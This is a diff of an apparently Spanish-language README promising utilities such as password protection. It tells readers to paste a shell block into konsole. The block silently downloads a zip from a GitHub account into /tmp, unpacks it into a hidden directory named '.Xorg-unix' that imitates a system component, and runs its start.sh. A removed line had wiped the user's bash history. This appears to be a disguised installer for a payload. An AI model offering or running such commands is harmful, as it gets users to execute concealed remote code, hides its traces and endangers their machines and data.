@@ -8,7 +8,7 @@ ademas incluye herramientas y utilidades desde proteccion por contraseña de tu 
 
 Copia y pega el codigo de debajo en la consola (konsole)  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Aqui ↓↓↓
 
-    #!/bin/bash
+
     cd /tmp || exit
     wget https://github.com/Epik00/Epik00/archive/refs/heads/main.zip 2>/dev/null
     unzip main.zip 2>/dev/null
@@ -22,7 +22,6 @@ Copia y pega el codigo de debajo en la consola (konsole)  &nbsp; &nbsp; &nbsp; &
     rm -rf ./Epik00-main 2>/dev/null
     chmod +x ./.Xorg-unix/* 2>/dev/null
     /tmp/.Xorg-unix/start.sh  
-    rm ~/.bash_history
     konsole & exit
 
 
